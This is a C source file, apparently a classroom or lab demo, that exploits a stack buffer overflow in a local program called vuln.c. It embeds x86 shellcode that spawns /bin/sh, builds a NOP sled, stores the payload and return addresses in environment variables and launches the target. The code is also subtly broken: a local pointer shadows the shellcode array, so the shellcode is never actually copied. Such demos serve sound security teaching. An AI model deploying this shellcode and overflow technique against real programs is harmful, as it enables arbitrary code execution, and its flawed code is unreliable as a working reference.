/**
-----------------------------------
Devin Suy
GitHub: https://github.com/devinsuy
LinkTree: http://devinsuy.com/
-----------------------------------
**/

#include <stdlib.h>
#include <string.h>

// https://c9x.me/x86/html/file_module_x86_id_217.html
// i386 OPcode used for "NO-OP Sled" into launch_sh (increases odds)
#define NO_OP 0x90

// Payload of instructions to inject to launch shell
char launch_sh[] =
  "\xeb\x1f\x5e\x89"
  "\x76\x08\x31\xc0"
  "\x88\x46\x07\x89"
  "\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e"
  "\x08\x8d\x56\x0c"
  "\xcd\x80\x31\xdb"
  "\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff"
  "\xff\xff/bin/sh";

// Dev env is on a x86 architecture, use movl for 32 bit operands
// system stack pointer and return registers to get addr of sp
unsigned long sp_ref(void) { __asm__("movl %esp,%eax"); }

int main(int argc, char *argv[]) {
    // Variables used should be initialized beforehand in C
    long *sp_ptr, sp;
    char *adr_jmp, *ptr, *launch_sh;
    int i; 

    // Size of payload jumped to, can be increased but the structure
    // of vuln.c src and size of buffer to be attacked is known and
    // will not change for the purpose of this demo
    int LAUNCH_SH_SIZE = 1024;

    // Using GDB, for LAUNCH_SH_SIZE=1024 -> ADR_JMP_SIZE must be 
    // atleast 187 (see ADR_JMP_SIZE.PNG) 
    // Read CLI argument for user specified ADR_JMP_SIZE value otherwise
    int ADR_JMP_SIZE = (argc > 1) ? atoi(argv[1]) : 187;

    // Allocate memory for the ADR_JMP and LAUNCH_SH payload
    if (!(adr_jmp= malloc(ADR_JMP_SIZE)) || !(launch_sh = malloc(LAUNCH_SH_SIZE))) {
        printf("Malloc failed, exiting..\n");
        exit(0);
    }

    // Store the JMP address into our payload to be injected
    // through overflowing the buffer in vuln.c
    sp = sp_ref();
    ptr = adr_jmp;
    sp_ptr = (long *) ptr;
    for (i = 0; i < ADR_JMP_SIZE; i+=4) { *(sp_ptr++) = sp; }

    // Load payload JMPd to with leading NO-OP sled
    ptr = launch_sh;
    for (i = 0; i < LAUNCH_SH_SIZE - strlen(launch_sh) - 1; i++) { *(ptr++) = NO_OP; }

    // Use same ptr to load remaining with the launch_sh instructions
    for (i = 0; i < strlen(launch_sh); i++) { *(ptr++) = launch_sh[i]; }

    // C uses null terminating character to mark end
    adr_jmp[ADR_JMP_SIZE - 1] = launch_sh[LAUNCH_SH_SIZE - 1] = '\0';

    // We are overflowing a buffer that is smaller than the size of our
    // launch_sh payload, make use of environmental variables instead
    // (access assumed, may not be the case on modern systems)
    memcpy(launch_sh,"SHL=",4);
    putenv(launch_sh);
    memcpy(adr_jmp,"ADR=",4);
    putenv(adr_jmp);

    // vuln.c must be compiled beforehand, launches and passes the
    // array filled with the address to secondary payload (will overflow
    // the buffer and RET in vuln.c, transfering control and launch shell) 
    execl("./vuln", "vuln", adr_jmp, 0);

    return 0;
}